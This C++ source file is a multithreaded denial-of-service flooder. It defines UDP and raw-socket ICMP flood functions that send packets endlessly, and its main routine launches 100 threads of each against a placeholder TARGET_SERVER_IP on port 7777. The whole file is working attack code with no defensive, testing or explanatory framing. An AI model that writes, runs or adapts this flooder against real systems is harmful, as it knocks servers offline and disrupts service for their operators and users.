#include <iostream>
#include <thread>
#include <vector>
#include <random>
#include <cstring>
#include <cstdlib>
#include <chrono>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <ctime>

using namespace std;

unsigned short checksum(void* b, int len) {
    unsigned short* buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void udp_flood(const char* target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    char packet[2048];
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 255);
    while (true) {
        for (int i = 0; i < sizeof(packet); ++i) {
            packet[i] = dis(gen);
        }
        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target_addr, sizeof(target_addr));
    }
}

void icmp_flood(const char* target_ip) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = 0;
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    char packet[512];
    memset(packet, 0, sizeof(packet));
    struct icmphdr* icmp_hdr = (struct icmphdr*)packet;
    icmp_hdr->type = ICMP_ECHO;
    icmp_hdr->code = 0;
    icmp_hdr->checksum = 0;
    icmp_hdr->un.echo.id = htons(12345);
    icmp_hdr->un.echo.sequence = htons(1);
    icmp_hdr->checksum = checksum(packet, sizeof(packet));
    while (true) {
        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target_addr, sizeof(target_addr));
    }
}

void udp_burst_attack(const char* target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    char packet[4096];
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 255);
    while (true) {
        for (int i = 0; i < sizeof(packet); ++i) {
            packet[i] = dis(gen);
        }
        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target_addr, sizeof(target_addr));
    }
}

void icmp_burst_attack(const char* target_ip) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = 0;
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    char packet[1024];
    memset(packet, 0, sizeof(packet));
    struct icmphdr* icmp_hdr = (struct icmphdr*)packet;
    icmp_hdr->type = ICMP_ECHO;
    icmp_hdr->code = 0;
    icmp_hdr->checksum = 0;
    icmp_hdr->un.echo.id = htons(12345);
    icmp_hdr->un.echo.sequence = htons(1);
    icmp_hdr->checksum = checksum(packet, sizeof(packet));
    while (true) {
        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target_addr, sizeof(target_addr));
    }
}

int main() {
    const char* target_ip = "TARGET_SERVER_IP";
    int target_port = 7777;
    int thread_count = 100;
    vector<thread> threads;
    for (int i = 0; i < thread_count; ++i) {
        threads.push_back(thread(udp_flood, target_ip, target_port));
    }
    for (int i = 0; i < thread_count; ++i) {
        threads.push_back(thread(icmp_flood, target_ip));
    }
    for (int i = 0; i < thread_count; ++i) {
        threads.push_back(thread(udp_burst_attack, target_ip, target_port));
    }
    for (int i = 0; i < thread_count; ++i) {
        threads.push_back(thread(icmp_burst_attack, target_ip));
    }
    for (auto& th : threads) {
        th.join();
    }
    return 0;
}
